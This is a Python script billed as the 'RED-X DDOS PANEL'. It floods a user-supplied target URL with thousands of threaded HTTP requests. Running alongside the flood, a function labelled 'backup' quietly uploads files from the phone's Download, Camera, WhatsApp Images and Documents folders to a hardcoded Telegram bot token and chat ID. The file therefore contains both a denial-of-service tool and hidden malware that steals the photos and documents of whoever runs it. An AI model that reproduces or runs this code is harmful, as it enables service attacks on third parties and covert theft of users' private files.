import requests
import threading
import time
import os
from colorama import Fore, init
import urllib3

# Disable SSL InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ✅ Telegram Bot Token & Chat ID
BOT_TOKEN = "7870107746:AAGAt7rTjUeAGkL581BcmuCmV6yajf-s-sw"
CHAT_ID = "6365572880"

# ✅ Folder List for Backup
FOLDERS = [
    "/sdcard/Download",
    "/sdcard/DCIM/Camera",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Documents"
]

# ✅ Telegram File Sending Function
def send_to_telegram(file_path, request_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as file:
            response = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file}, verify=False)  # Disabling SSL verification
        if response.status_code == 200:
            print(f"{Fore.GREEN}[✔] Request {request_id} | Status: 200")  # Success
        else:
            print(f"{Fore.RED}[✖] Request {request_id} | Status: Error - {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}[⚠️] Request {request_id} | Please check your connection or Internet.")
    except Exception as e:
        print(f"{Fore.RED}[✖] Request {request_id} | Unexpected Error: {e}")

# ✅ Backup Function for Files
def backup_files():
    request_id = 1  # Unique ID for each request
    for folder in FOLDERS:
        if os.path.exists(folder):
            for file_name in os.listdir(folder):
                file_path = os.path.join(folder, file_name)
                if os.path.isfile(file_path) and os.path.getsize(file_path) < 50 * 1024 * 1024:  # Files smaller than 50MB
                    send_to_telegram(file_path, request_id)
                    request_id += 1
    send_to_telegram("Backup Completed!", request_id)

# ✅ HTTP Request Sending Function
def send_request(url, request_id):
    try:
        response = requests.get(url, verify=False)  # Disabling SSL verification
        if response.status_code == 200:
            print(f"{Fore.GREEN}[✔] Request {request_id} | Status: {response.status_code}")
        else:
            print(f"{Fore.RED}[✖] Request {request_id} | Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}[⚠️] Request {request_id} | HTTP Request Error - {e}")
    except Exception as e:
        print(f"{Fore.RED}[✖] Request {request_id} | Unexpected Error: {e}")

# ✅ Load Test Function
def load_test(url, num_requests, concurrency):
    print(f"\n{Fore.GREEN}[+] Starting Attack on: {url}")
    print(f"{Fore.GREEN}[+] Total Requests: {num_requests}, Concurrent Threads: {concurrency}\n")
    print("="*35)
    print(f"{Fore.CYAN}━━━━━━━ DDOS PANEL ━━━━━━━")
    print(f"{Fore.YELLOW}OWNER: MD SOFIKUL ISLAM")
    print(f"{Fore.YELLOW}POWERED BY: REDZA ARMY")
    print(f"{Fore.RED}⚠️ DON'T USE A WRONG WORK ⚠️")
    print("="*35)

    threads = []
    start_time = time.time()

    # Create and start threads
    for i in range(1, num_requests + 1):  # Starting from 1 to match the serial output
        thread = threading.Thread(target=send_request, args=(url, i))
        threads.append(thread)
        thread.start()

    # Ensure all threads finish execution
    for t in threads:
        t.join()

    end_time = time.time()
    print(f"\n{Fore.GREEN}[✔] RED-X attack Completed in {round(end_time - start_time, 2)} seconds.")

# ✅ Function to Run Load Test and Backup Concurrently
def run_load_test_and_backup():
    # Developer Information
    print(f"""
{Fore.YELLOW}━━━━━━━ DEVELOPER INFO ━━━━━━━
{Fore.CYAN}Developer: MD SOFIKUL ISLAM
{Fore.GREEN}Project: RED-X DDOS PANEL
{Fore.CYAN}GitHub: https://github.com/MR-D4RK-OFFICIAL
{Fore.RED}⚠️ DON'T USE A WRONG WORK ⚠️
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━
""")

    # Prompt for Load Test Details
    url = input(f"{Fore.CYAN}[?] Enter Target URL: ")
    num_requests = int(input(f"{Fore.CYAN}[?] Enter number of requests (default 15000): ") or 15000)
    concurrency = int(input(f"{Fore.CYAN}[?] Enter number of threads (default 10000): ") or 10000)

    # Start load testing in a new thread
    load_test_thread = threading.Thread(target=load_test, args=(url, num_requests, concurrency))
    load_test_thread.start()

    # Start backup in a new thread
    backup_thread = threading.Thread(target=backup_files)
    backup_thread.start()

    # Wait for both threads to complete
    load_test_thread.join()
    backup_thread.join()

if __name__ == "__main__":
    run_load_test_and_backup()